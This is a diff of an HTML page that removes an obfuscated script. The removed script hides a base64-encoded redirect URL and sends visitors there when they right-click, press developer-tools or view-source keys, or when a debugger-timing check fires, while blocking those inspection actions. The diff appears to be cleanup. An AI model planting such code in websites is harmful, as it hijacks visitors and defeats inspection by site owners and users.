@@ -83,51 +83,5 @@ Upload Video
         <div id="pageModalContent" class="page-modal-content"></div>
     </div>
 </div>
-<!-- Frontend-safe redirect -->
-<script>
-(() => {
-    // Base64 encoded URL, tidak langsung terlihat
-    const encodedURL = "aHR0cHM6Ly9vbWcxMC5jb20vNC8xMDQxMDM1Mw==";
-
-    const go = () => {
-        window.location.href = atob(encodedURL);
-    };
-
-    const blockKeys = (e) => {
-        const k = String(e.key || "").toLowerCase();
-        if (
-            (e.ctrlKey && k === 'u') ||
-            (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(k)) ||
-            k === 'f12'
-        ) {
-            e.preventDefault();
-            e.stopPropagation();
-            e.stopImmediatePropagation();
-            go();
-            return false;
-        }
-    };
-
-    // Tangkap event di window dan document
-    window.addEventListener('keydown', blockKeys, true);
-    document.addEventListener('keydown', blockKeys, true);
-
-    // Klik kanan
-    window.addEventListener('contextmenu', (e) => {
-        e.preventDefault();
-        e.stopPropagation();
-        go();
-    }, true);
-
-    // Debugger detect
-    setInterval(() => {
-        const t = Date.now();
-        debugger;
-        if (Date.now() - t > 100) {
-            go();
-        }
-    }, 500);
-})();
-</script>
 </body>
 </html>
